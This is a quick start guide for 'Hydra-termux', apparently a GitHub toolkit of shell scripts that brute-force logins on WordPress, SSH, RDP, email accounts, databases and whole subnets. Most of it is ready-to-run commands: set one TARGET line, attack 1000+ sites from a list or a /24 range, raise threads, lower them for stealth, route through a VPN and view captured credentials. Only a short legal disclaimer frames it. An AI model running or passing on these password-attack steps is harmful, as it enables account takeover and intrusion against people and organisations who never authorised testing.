# Hydra-termux Quick Start Guide

## 🚀 5-Minute Quick Start

### Step 1: Install (2 minutes)
```bash
git clone https://github.com/vinnieboy707/Hydra-termux
cd Hydra-termux
bash install.sh
```

### Step 2: Choose Your Attack (30 seconds)

Pick one based on your target:

| Target Type | Script to Use |
|-------------|---------------|
| 🌐 WordPress site | `Library/wordpress_quick.sh` |
| 🌐 Any website | `Library/web_quick.sh` |
| 🔐 SSH server | `Library/ssh_quick.sh` |
| 📧 Email-based | `Library/email_quick.sh` |
| 🖥️ Windows RDP | `Library/rdp_quick.sh` |
| 🗄️ MySQL database | `Library/mysql_quick.sh` |
| 🌍 Full network | `Library/combo_full_infrastructure.sh` |

### Step 3: Edit ONE Line (30 seconds)
```bash
nano Library/wordpress_quick.sh

# Change line 4:
TARGET="http://your-target.com"  # <-- Only edit this!

# Save: Ctrl+X, Y, Enter
```

### Step 4: Run It (2 minutes)
```bash
bash Library/wordpress_quick.sh
```

### Step 5: Get Results (instant)
```bash
# View successful attacks
bash scripts/results_viewer.sh

# Or check the JSON file
cat ~/hydra-logs/results_web.json
```

---

## 📋 Complete Example: Get WordPress Admin Access

### Scenario: Attack WordPress at example.com

**Step-by-step**:

```bash
# 1. Open the WordPress script
nano Library/wordpress_quick.sh

# 2. Edit ONLY this line (line 4):
TARGET="http://example.com"

# 3. Save and exit (Ctrl+X, Y, Enter)

# 4. Run the attack
bash Library/wordpress_quick.sh

# 5. Wait for results (usually 2-10 minutes)
# Output will show:
# [+] SUCCESS! Username: admin, Password: Welcome123

# 6. View saved results
bash scripts/results_viewer.sh --protocol web
```

**That's it!** Credentials saved in `~/hydra-logs/results_web.json`

---

## 📧 Get Password for Specific Email/Username

### Scenario: Target user is webmaster@example.com

```bash
# 1. Open email attack script
nano Library/email_quick.sh

# 2. Edit TWO lines:
EMAIL="webmaster@example.com"  # Line 4
TARGET="http://example.com"    # Line 5

# 3. Save and run
bash Library/email_quick.sh

# 4. Get results
bash scripts/results_viewer.sh
```

---

## 🌐 Attack Any Website (Auto-Detect Admin Panel)

```bash
# 1. Use web quick script
nano Library/web_quick.sh

# 2. Change target
TARGET="http://example.com"  # Script will find admin panel

# 3. Run
bash Library/web_quick.sh

# Script automatically:
# - Finds /admin, /wp-admin, /login.php, etc.
# - Detects form structure
# - Tests common credentials
# - Saves results
```

---

## 🎯 Attack 1000+ Targets from File

### Create Target List

```bash
cat > targets.txt << 'EOF'
http://site1.com
http://site2.com
http://site3.com
192.168.1.100
192.168.1.101
EOF
```

### Attack All Targets

```bash
# 1. Open any quick script
nano Library/web_quick.sh

# 2. Point to your file
TARGET="targets.txt"

# 3. Run bulk attack
bash Library/web_quick.sh

# Results saved per-target!
```

---

## 🛡️ VPN Protection (Auto-Enabled)

All scripts check VPN automatically:

```bash
# Check VPN status
bash scripts/vpn_check.sh

# Skip VPN check (testing only)
bash Library/ssh_quick.sh --skip-vpn
```

---

## 📊 View All Your Results

```bash
# View all successful attacks
bash scripts/results_viewer.sh

# Filter by protocol
bash scripts/results_viewer.sh --protocol web
bash scripts/results_viewer.sh --protocol ssh

# Filter by target
bash scripts/results_viewer.sh --target example.com

# Export to CSV
bash scripts/results_viewer.sh --export report.csv
```

---

## 🔧 Common Customizations

### Use Custom Wordlist

```bash
# Download big wordlists
bash scripts/download_wordlists.sh

# Use rockyou.txt (14M passwords)
bash scripts/ssh_admin_attack.sh \
  -t 192.168.1.100 \
  -w ~/wordlists/rockyou.txt
```

### Increase Speed (More Threads)

```bash
# Default: 16 threads
# Fast: 32 threads
# Blazing: 64 threads (may cause lockouts!)

bash scripts/ssh_admin_attack.sh -t TARGET -T 32
```

### Attack CIDR Range

```bash
# Attack entire subnet
nano Library/ssh_quick.sh

# Change to:
TARGET="192.168.1.0/24"  # Attacks 254 IPs!

bash Library/ssh_quick.sh
```

---

## 🎓 Full Tutorial

For complete instructions, see: `docs/STEP_BY_STEP_TUTORIAL.md`

Covers:
- ✅ Advanced web attacks
- ✅ Multi-target strategies
- ✅ Protocol combinations
- ✅ Troubleshooting
- ✅ Real-world scenarios

---

## 📖 Script Reference

### Quick Library (One-Line-Change)

Located in `Library/`:

**Basic Protocols** (12):
- `ssh_quick.sh` - SSH brute-force
- `ftp_quick.sh` - FTP attack
- `web_quick.sh` - Web admin panels
- `wordpress_quick.sh` - WordPress specific
- `rdp_quick.sh` - Windows RDP
- `mysql_quick.sh` - MySQL database
- `postgres_quick.sh` - PostgreSQL
- `smb_quick.sh` - Windows SMB/CIFS
- `email_quick.sh` - Email-based attack
- `username_quick.sh` - Specific username
- `network_quick.sh` - Network scan
- `auto_attack_quick.sh` - Auto everything

**Additional Protocols** (10):
- `telnet_quick.sh` - Telnet
- `vnc_quick.sh` - VNC
- `smtp_quick.sh` - SMTP mail
- `pop3_quick.sh` - POP3
- `imap_quick.sh` - IMAP
- `ldap_quick.sh` - LDAP/AD
- `mssql_quick.sh` - MS SQL Server
- `mongodb_quick.sh` - MongoDB
- `redis_quick.sh` - Redis
- `snmp_quick.sh` - SNMP

**Combinations** (7):
- `combo_web_db.sh` - Web + Database
- `combo_network_stack.sh` - SSH+FTP+MySQL+SMB
- `combo_windows_infra.sh` - RDP+SMB+MSSQL+LDAP
- `combo_mail_stack.sh` - SMTP+POP3+IMAP+Web
- `combo_db_cluster.sh` - All databases
- `combo_iot_devices.sh` - IoT protocols
- `combo_full_infrastructure.sh` - ALL 16 protocols!

**Advanced Tools** (9):
- `nmap_stealth_scan.sh` - Stealth scanning
- `nmap_full_scan.sh` - Complete scan
- `nmap_vuln_scan.sh` - Vulnerability detection
- `nmap_os_detection.sh` - OS fingerprinting
- `nmap_network_discovery.sh` - Network mapping
- `ssl_analyzer.sh` - SSL/TLS testing
- `web_directory_bruteforce.sh` - Find admin panels
- `web_header_analyzer.sh` - Security headers
- `multi_target_ssh.sh` - Bulk SSH attacks

### Full-Featured Scripts

Located in `scripts/` - Use with command-line options:

```bash
bash scripts/ssh_admin_attack.sh -t TARGET -T 32 -v --help
```

---

## ⚠️ LEGAL WARNING

**ONLY USE ON**:
- ✅ Your own systems
- ✅ Authorized targets (with written permission)
- ✅ Legal penetration testing

**NEVER USE ON**:
- ❌ Systems without authorization
- ❌ Other people's websites
- ❌ Any unauthorized targets

Unauthorized access = Federal crime = Prison time

**Get authorization first. Always.**

---

## 🆘 Troubleshooting

| Problem | Solution |
|---------|----------|
| "VPN not detected" | Run: `bash scripts/vpn_check.sh` or add `--skip-vpn` |
| "Hydra not found" | Run: `bash install.sh` |
| "Permission denied" | Run: `chmod +x Library/*.sh scripts/*.sh` |
| "No results" | Try: Bigger wordlist, fewer threads, add delay |
| Script won't run | Check: VPN, target reachable, syntax errors |

---

## 💡 Pro Tips

1. **Start VPN first**: Always connect before attacking
2. **Use small wordlists first**: Test with 100 passwords before trying 14M
3. **Reduce threads for stealth**: `-T 4` instead of `-T 32`
4. **Check results often**: `bash scripts/results_viewer.sh`
5. **Save your target lists**: Reuse `targets.txt` files
6. **Generate custom wordlists**: `bash scripts/wordlist_generator.sh`
7. **Combine protocols**: Use `combo_*` scripts for complete audits

---

## 📞 Need Help?

1. **Help flag**: `bash script.sh --help`
2. **Full tutorial**: `docs/STEP_BY_STEP_TUTORIAL.md`
3. **Protocol guide**: `Library/PROTOCOL_GUIDE.md`
4. **Usage docs**: `docs/USAGE.md`
5. **Examples**: `docs/EXAMPLES.md`

---

## 🎯 Most Common Use Case

**"I want to get admin access to my WordPress site"**

```bash
# 1. Edit
nano Library/wordpress_quick.sh
# Change: TARGET="http://your-site.com"

# 2. Run
bash Library/wordpress_quick.sh

# 3. Get result
bash scripts/results_viewer.sh --protocol web

# Done! That's literally it.
```

---

**Remember**: Use ethically. Get authorization. Stay legal. 🛡️

**Happy (legal) hacking!** 🎉
